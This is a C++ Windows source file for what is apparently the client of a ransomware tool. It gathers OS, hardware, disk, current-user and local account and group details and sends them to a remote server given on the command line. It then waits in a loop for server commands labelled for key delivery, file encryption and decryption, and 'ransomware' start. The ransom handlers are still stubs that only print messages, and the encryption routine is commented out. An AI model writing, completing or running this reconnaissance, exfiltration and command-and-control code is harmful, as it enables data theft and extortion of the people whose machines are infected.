#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <array>
#include <sstream>
#include <iomanip>
#include <algorithm>

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iphlpapi.h>
#include <psapi.h>
#include <intrin.h>
#include <bcrypt.h>
#include <userenv.h>
#include <Lmcons.h>
#include <aclapi.h>
#include <lm.h>
#include <lmaccess.h>
#include <lmapibuf.h>

#include <openssl/pem.h>
#include <openssl/rsa.h>
#include <openssl/bio.h>
#include <openssl/err.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "libssl.lib")
#pragma comment(lib, "libcrypto.lib")
#pragma comment(lib, "userenv.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "netapi32.lib")

void initWinsock() {
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        std::cerr << "WSAStartup failed: " << result << std::endl;
        exit(1);
    }
}

/* Allocate socket */
SOCKET connectSocket(const std::string& host, int port) {
    addrinfo hints = {0};  // Initialize hints to zero
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    addrinfo* result = nullptr;
    int iResult = getaddrinfo(host.c_str(), std::to_string(port).c_str(), &hints, &result);
    if (iResult != 0) {
        std::cerr << "getaddrinfo failed: " << iResult << std::endl;
        WSACleanup();
        exit(1);
    }

    SOCKET ConnectSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (ConnectSocket == INVALID_SOCKET) {
        std::cerr << "Error at socket(): " << WSAGetLastError() << std::endl;
        freeaddrinfo(result);
        WSACleanup();
        exit(1);
    }

    iResult = connect(ConnectSocket, result->ai_addr, (int)result->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        closesocket(ConnectSocket);
        ConnectSocket = INVALID_SOCKET;
        std::cerr << "Unable to connect to server!" << std::endl;
        WSACleanup();
        exit(1);
    }

    freeaddrinfo(result);
    return ConnectSocket;
}

std::string getOSInfo() {
    OSVERSIONINFOEX osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

    if (!GetVersionEx((OSVERSIONINFO*)&osvi)) {
        return "Failed to get OS version\n";
    }

    std::ostringstream info;
    info << "OS Version: " << osvi.dwMajorVersion << '.' << osvi.dwMinorVersion << "\n"
         << "Build Number: " << osvi.dwBuildNumber << "\n"
         << "OS Type: " << (osvi.wProductType == VER_NT_WORKSTATION ? "Workstation" : "Server") << "\n";
    return info.str();
}

std::string getProcessorInfo() {
    std::array<int, 4> cpuInfo;
    __cpuid(cpuInfo.data(), 0);
    int nIds = cpuInfo[0];

    char brand[0x40] = {0};
    if (nIds >= 0x80000004) {
        __cpuid(reinterpret_cast<int*>(brand), 0x80000002);
        __cpuid(reinterpret_cast<int*>(brand + 16), 0x80000003);
        __cpuid(reinterpret_cast<int*>(brand + 32), 0x80000004);
    }

    std::ostringstream info;
    info << "Processor Brand: " << brand << "\n";
    return info.str();
}

std::string getMemoryInfo() {
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    GlobalMemoryStatusEx(&statex);

    std::ostringstream info;
    info << "Total Physical Memory (GB): " << statex.ullTotalPhys / (1024.0 * 1024.0 * 1024.0) << "\n"
         << "Free Physical Memory (GB): " << statex.ullAvailPhys / (1024.0 * 1024.0 * 1024.0) << "\n"
         << "Total Virtual Memory (GB): " << statex.ullTotalVirtual / (1024.0 * 1024.0 * 1024.0) << "\n"
         << "Free Virtual Memory (GB): " << statex.ullAvailVirtual / (1024.0 * 1024.0 * 1024.0) << "\n";
    return info.str();
}

std::string getDiskInfo() {
    ULARGE_INTEGER freeBytesAvailableToCaller, totalNumberOfBytes, totalNumberOfFreeBytes;

    if (GetDiskFreeSpaceEx(NULL, &freeBytesAvailableToCaller, &totalNumberOfBytes, &totalNumberOfFreeBytes)) {
        std::ostringstream info;
        info << "Total Disk Space (GB): " << totalNumberOfBytes.QuadPart / (1024.0 * 1024.0 * 1024.0) << "\n"
             << "Free Disk Space (GB): " << totalNumberOfFreeBytes.QuadPart / (1024.0 * 1024.0 * 1024.0) << "\n";
        return info.str();
    } else {
        return "Failed to get disk information";
    }
}

std::string getUserInfo() {
    char username[UNLEN + 1];
    DWORD usernameLen = UNLEN + 1;

    if (GetUserName(username, &usernameLen)) {
        std::ostringstream info;
        info << "Current User: " << username << "\n";
        return info.str();
    } else {
        return "Failed to get user information";
    }
}

std::string getUsersAndGroupsInfo() {
    std::ostringstream info;

    DWORD entriesRead = 0, totalEntries = 0, resumeHandle = 0;
    PUSER_INFO_0 userBuffer = nullptr;

    // Enumerate local users
    NET_API_STATUS status = NetUserEnum(
        NULL, // local machine
        0, // level 0 for basic information
        FILTER_NORMAL_ACCOUNT, // normal user accounts
        (LPBYTE*)&userBuffer, // pointer to receive the data
        MAX_PREFERRED_LENGTH, // no size limit
        &entriesRead, // count of entries read
        &totalEntries, // total available entries
        &resumeHandle // continuation pointer
    );

    if (status == NERR_Success) {
        for (DWORD i = 0; i < entriesRead; i++) {
            info << "User: " << userBuffer[i].usri0_name << "\n";

            PLOCALGROUP_USERS_INFO_0 groupBuffer = nullptr;
            DWORD groupEntriesRead = 0, groupTotalEntries = 0;

            // Retrieve the groups for the user
            status = NetUserGetLocalGroups(
                NULL, // local machine
                userBuffer[i].usri0_name, // user's name
                0, // level 0
                LG_INCLUDE_INDIRECT, // include indirect memberships
                (LPBYTE*)&groupBuffer, // pointer to receive the data
                MAX_PREFERRED_LENGTH, // no size limit
                &groupEntriesRead, // count of group entries read
                &groupTotalEntries // total group entries
            );

            if (status == NERR_Success) {
                for (DWORD j = 0; j < groupEntriesRead; j++) {
                    info << "  Group: " << groupBuffer[j].lgrui0_name << "\n";
                }
                NetApiBufferFree(groupBuffer);
            }
        }
        NetApiBufferFree(userBuffer);
    }

    return info.str();
}

std::string getAllSystemInfo() {
    std::ostringstream info;

    info << getOSInfo() << getProcessorInfo() << getMemoryInfo() 
         << getDiskInfo() << getUserInfo() << getUsersAndGroupsInfo();

    return info.str();
}


/* Helper function, replace sendall() in python */
void sendData(SOCKET sock, const char* buffer, int len) {
    send(sock, buffer, len, 0);
}

// Function to receive a public key in PEM format
std::vector<char> receivePublicKey(SOCKET sock) {
    std::vector<char> buffer(4096);
    int bytesReceived = recv(sock, buffer.data(), buffer.size(), 0);
    if (bytesReceived == SOCKET_ERROR) {
        std::cerr << "Failed to receive public key\n";
        return {};
    }
    buffer.resize(bytesReceived);
    return buffer;
}

// Implement the function to load the public key
EVP_PKEY* loadPublicKey(const std::vector<char>& pemKey) {
    BIO* bio = BIO_new_mem_buf(pemKey.data(), static_cast<int>(pemKey.size()));
    EVP_PKEY* pubKey = PEM_read_bio_PUBKEY(bio, NULL, NULL, NULL);
    BIO_free(bio);
    return pubKey;
}

/*
std::vector<unsigned char> encryptData(const std::vector<unsigned char>& data, EVP_PKEY* key) {
    EVP_PKEY_CTX* ctx = EVP_PKEY_CTX_new(key, nullptr);
    if (!ctx || EVP_PKEY_encrypt_init(ctx) <= 0 || EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_OAEP_PADDING) <= 0) {
        EVP_PKEY_CTX_free(ctx);
        return {};
    }

    size_t outlen;
    if (EVP_PKEY_encrypt(ctx, nullptr, &outlen, data.data(), data.size()) <= 0) {
        EVP_PKEY_CTX_free(ctx);
        return {};
    }

    std::vector<unsigned char> encrypted(outlen);
    if (EVP_PKEY_encrypt(ctx, encrypted.data(), &outlen, data.data(), data.size()) <= 0) {
        EVP_PKEY_CTX_free(ctx);
        return {};
    }

    encrypted.resize(outlen);
    EVP_PKEY_CTX_free(ctx);
    return encrypted;
}
*/

/*
void sendEncryptedData(const SOCKET& sock, const std::string& data, EVP_PKEY* pubKey) {
    const size_t maxChunkSize = 190; // Max chunk size compatible with RSA-OAEP-SHA-256
    size_t offset = 0;
    std::vector<unsigned char> rawData(data.begin(), data.end()); // Convert to byte vector

    while (offset < rawData.size()) {
        // Split data into chunks
        size_t chunkLength = std::min(maxChunkSize, rawData.size() - offset);
        std::vector<unsigned char> chunk(rawData.begin() + offset, rawData.begin() + offset + chunkLength);

        // Encrypt the chunk
        std::vector<unsigned char> encryptedChunk = encryptData(chunk, pubKey);

        if (encryptedChunk.empty()) {
            std::cerr << "Encryption failed for a chunk.\n";
            break;
        }

        // Print the encrypted chunk in hexadecimal format
        std::cout << "Encrypted Chunk (hex): ";
        for (auto byte : encryptedChunk) {
            std::cout << std::hex << std::setw(2) << std::setfill('0') << (int)byte;
        }
        std::cout << std::dec << std::endl;

        // Send the encrypted chunk over the socket
        send(sock, reinterpret_cast<const char*>(encryptedChunk.data()), encryptedChunk.size(), 0);

        offset += chunkLength; // Move to the next chunk
    }

    // Send EOF signal
    send(sock, "EOF", 3, 0);
}
*/

void sendData(const SOCKET& sock, const std::string& data, EVP_PKEY* pubKey) {
    const size_t maxChunkSize = 190; // Max chunk size compatible with RSA-OAEP-SHA-256
    size_t offset = 0;
    std::vector<unsigned char> rawData(data.begin(), data.end()); // Convert to byte vector

    while (offset < rawData.size()) {
        // Split data into chunks
        size_t chunkLength = std::min(maxChunkSize, rawData.size() - offset);
        std::vector<unsigned char> chunk(rawData.begin() + offset, rawData.begin() + offset + chunkLength);

        // Send the encrypted chunk over the socket
        send(sock, reinterpret_cast<const char*>(chunk.data()), chunk.size(), 0);

        offset += chunkLength; // Move to the next chunk
    }

    // Send EOF signal
    send(sock, "EOF", 3, 0);
}

void savePrivateKey(const std::vector<char>& keyData, const std::string& filePath) {
    std::ofstream keyFile(filePath, std::ios::binary);
    if (!keyFile) {
        std::cerr << "Failed to open file: " << filePath << "\n";
        return;
    }
    keyFile.write(keyData.data(), keyData.size());
    keyFile.close();
    std::cout << "Private key successfully saved to " << filePath << ".\n";
}

void handleCommand(const std::string& cmd) {
    if (cmd.rfind("pk", 0) == 0) {
        std::vector<char> keyData(cmd.begin() + 2, cmd.end());
        savePrivateKey(keyData, "received_private_key.pem");
    } else if (cmd.rfind("enc", 0) == 0) {
        std::string fileToEncrypt(cmd.begin() + 3, cmd.end());
        std::cout << "Attempting to encrypt file: " << fileToEncrypt << ".\n";
    } else if (cmd.rfind("dec", 0) == 0) {
        std::string fileToDecrypt(cmd.begin() + 3, cmd.end());
        std::cout << "Attempting to decrypt file: " << fileToDecrypt << ".\n";
    } else if (cmd.rfind("ran", 0) == 0) {
        std::cout << "Starting ransomware...\n";
    } else if (cmd.rfind("res", 0) == 0) {
        std::vector<char> keyData(cmd.begin() + 3, cmd.end());
        savePrivateKey(keyData, "received_private_key.pem");
        std::cout << "Restoring data...\n";
    } else {
        std::cerr << "Unknown command received.\n";
    }
}

void waitForCommands(SOCKET& clientSocket) {
    while (true) {
        std::vector<char> receivedData;

        try {
            std::cout << "Waiting for command from the server...\n";

            while (true) {
                char buffer[4096];
                int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);

                if (bytesReceived <= 0) {
                    break;  // No data or connection closed
                }

                receivedData.insert(receivedData.end(), buffer, buffer + bytesReceived);

                if (bytesReceived >= 3 && std::equal(buffer + bytesReceived - 3, buffer + bytesReceived, "EOF")) {
                    receivedData.erase(receivedData.end() - 3, receivedData.end());
                    break;
                }
            }

            if (!receivedData.empty()) {
                std::string cmd(receivedData.begin(), receivedData.end());
                handleCommand(cmd);
            }
        } catch (const std::exception& e) {
            std::cerr << "Error: " << e.what() << "\n";
            break; // Exit the loop on an exception
        }

        if (receivedData.empty()) {
            break; // Exit the loop if no commands were received
        }
    }
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        std::cerr << "Usage: " << argv[0] << " <host> <port>\n";
        return 1;
    }

    std::string host = argv[1];
    int port;
    try {
        port = std::stoi(argv[2]);
    } catch (const std::invalid_argument&) {
        std::cerr << "Invalid port number: " << argv[2] << "\n";
        return 1;
    } catch (const std::out_of_range&) {
        std::cerr << "Port number out of range: " << argv[2] << "\n";
        return 1;
    }

    // Initialize Winsock
    initWinsock();

    // Connect to the server
    SOCKET sock = connectSocket(host, port);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Failed to connect to server.\n";
        WSACleanup();
        return 1;
    }

    // Receive public key
    std::vector<char> pemKey = receivePublicKey(sock);
    EVP_PKEY* pubKey = loadPublicKey(pemKey);
    if (!pubKey) {
        std::cerr << "Failed to load public key\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Get and send system information
    std::string systemInfo = getAllSystemInfo();
    sendData(sock, systemInfo, pubKey);

    // Wait for server commands
    waitForCommands(sock);

    // Clean up resources
    EVP_PKEY_free(pubKey);
    closesocket(sock);
    WSACleanup();

    return 0;
}
